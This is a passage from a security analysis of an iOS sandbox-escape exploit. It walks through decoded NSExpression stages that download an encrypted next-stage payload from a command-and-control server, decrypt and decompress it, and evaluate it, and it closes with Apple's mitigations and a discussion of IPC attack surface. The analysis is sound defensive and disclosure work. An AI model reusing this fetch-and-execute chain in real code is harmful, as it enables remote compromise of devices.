 <p><span>[ [CaliCalendarAnonymizer sharedAnonymizedString]</span></p>
 <p><span>  setObject:</span></p>
 <p><span>    [NSPropertyListSerialization</span></p>
 <p><span>      propertyListWithData:</span></p>
 <p><span>        [[[NSData</span></p>
 <p><span>             dataWithContentsOfURL:</span></p>
 <p><span>               [[[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p><span>                 objectForKey:@&#34;0&#34;] URL]</span></p>
 <p><span>          ] AES128DecryptWithPassword:NSData(XXXX)</span></p>
 <p><span>         ]  decompressedDataUsingAlgorithm:3 error:]</span></p>
 <p><span>       options: Class(NSConstantValueExpression)</span></p>
 <p><span>      format: Class(NSConstantValueExpression)</span></p>
 <p><span>      errors:Class(NSConstantValueExpression)</span></p>
 <p><span>  ]</span></p>
 <p><span>  forKey:@&#34;1&#34;</span></p>
 <p><span>]</span></p>
 
 <p><span>The innermost reference to </span><span>sharedAnonymizedStrings</span><span> here grabs the </span><span>NSURLComponents</span><span> object and builds the full url from the query string parameters set last earlier. That url is passed to </span><span>[NSData dataWithContentsOfURL:]</span><span> to fetch a data blob from a remote server.</span></p>
 
 <p><span>That data blob is decrypted with a hardcoded AES128 key, decompressed using zlib then parsed as a plist. That parsed plist is stored in the </span><span>sharedAnonymizedStrings</span><span> dictionary under the key </span><span>&#34;1&#34;</span><span>.</span></p><h3 id="h.rmw3ubtmn06v"><span>Expression 5</span></h3>
 <p><span>[ [[NSThread mainThread] threadDictionary]</span></p>
 <p><span>  addEntriesFromDictionary:</span></p>
 <p><span>    [[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p><span>    objectForKey:@&#34;1&#34;]</span></p>
 <p><span>]</span></p>
 
 <p><span>This copies all the keys and values from the &#34;next-stage&#34; plist into the main thread&#39;s theadDictionary.</span></p><h3 id="h.qzgbnlme8c4b"><span>Expression 6</span></h3>
 <p><span>[ [NSExpression expressionWithFormat:</span></p>
 <p><span>    [[[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p><span>      objectForKey:@&#34;1&#34;]</span></p>
 <p><span>    objectForKey: @&#34;a&#34;]</span></p>
 <p><span>  ]</span></p>
 <p><span>  expressionValueWithObject:nil context:nil</span></p>
 <p><span>]</span></p>
 <p><span>Finally, this fetches the value of the &#34;</span><span>a</span><span>&#34; key from the next-stage plist, parses it as an </span><span>NSExpression</span><span> string and evaluates it.</span></p><h2 id="h.5m5pj8ghutz4"><span>End of the line</span></h2>
 <p><span>At this point we lose the ability to follow the exploit. The attackers have escaped the </span><span>IMTranscoderAgent</span><span> sandbox, requested a next-stage from the command and control server and executed it, all without any memory corruption or dependencies on particular versions of the operating system.</span></p>
 
 <p><span>In response to this exploit</span><span> </span><span><a href="https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-15_1-release-notes">iOS 15.1 significantly reduced the computational power available to NSExpressions</a></span><span>:</span></p>
 
 <p><span>NSExpression immediately forbids certain operations that have significant side effects, like creating and destroying objects. Additionally, casting string class names into Class objects with NSConstantValueExpression is deprecated.</span></p>
 
 <p><span>In addition the </span><span>PTSection</span><span> and </span><span>PTRow</span><span> objects have been hardened with the following check added around the parsing of serialized </span><span>NSPredicates</span><span>:</span></p>
 
 <p><span>if (os_variant_allows_internal_security_policies(</span></p>
 <p><span>      &#34;com.apple.PrototypeTools&#34;) {</span></p>
 <p><span>  [coder decodeObjectOfClass:NSPredicate forKey:@&#34;condition]</span></p>
 <p><span>...</span></p>
 
 <p><span>Object deserialization across trust boundaries still presents an enormous attack surface however</span><span>.</span></p><h2 id="h.fyh8k0aja0xk"><span>Conclusion</span></h2>
 <p><span>Perhaps the most striking takeaway is the depth of the attack surface reachable from what would hopefully be a fairly constrained sandbox. With just two tricks (</span><span>NSObject</span><span> pointers in protocols and library loading gadgets) it&#39;s likely possible to attack almost every </span><span>initWithCoder</span><span> implementation in the </span><span>dyld_shared_cache</span><span>. There are presumably many other classes in addition to </span><span>NSPredicate</span><span> and </span><span>NSExpression</span><span> which provide the building blocks for logic-style exploits.</span></p>
 
 <p><span>The expressive power of NSXPC just seems fundamentally ill-suited for use across sandbox boundaries, even though it was designed with exactly that in mind. The attack surface reachable from inside a sandbox should be minimal, enumerable and reviewable. Ideally only code which is required for correct functionality should be reachable; it should be possible to determine exactly what that exposed code is and the amount of exposed code should be small enough that manually reviewing it is tractable. </span></p>
 
 <p><span>NSXPC requiring developers to explicitly add remotely-exposed methods to interface protocols is a great example of how to make the attack surface enumerable - you can at least find all the entry points fairly easily. However the support for inheritance means that the attack surface exposed there likely isn&#39;t reviewable; it&#39;s simply too large for anything beyond a basic</span><span> example</span><span>.</span></p>
 
 <p><span>Refactoring these critical IPC boundaries to be more prescriptive - only allowing a much narrower set of objects in this case - would be a good step towards making the attack surface reviewable. This would probably require fairly significant refactoring for NSXPC; it&#39;s built around natively supporting the Objective-C inheritance model and is used very broadly. But without such changes the exposed attack surface is just too large to audit effectively.</span></p>
 
 <p><span>The advent of Memory Tagging Extensions (MTE), likely shipping in multiple consumer devices across the ARM ecosystem this year,</span><span> </span><span><a href="https://www.usenix.org/system/files/login/articles/login_summer19_03_serebryany.pdf">is a big step in the defense against memory corruption exploitation</a></span><span>. But attackers innovate too, and are likely already two steps ahead with a renewed focus on logic bugs. This sandbox escape exploit is likely a sign of the shift we can expect to see over the next few years if the promises of MTE can be delivered. And this exploit was far more extensible, reliable and generic than almost any memory corruption exploit could ever hope to be.</span></p>

</div></div>
  </body>
</html>
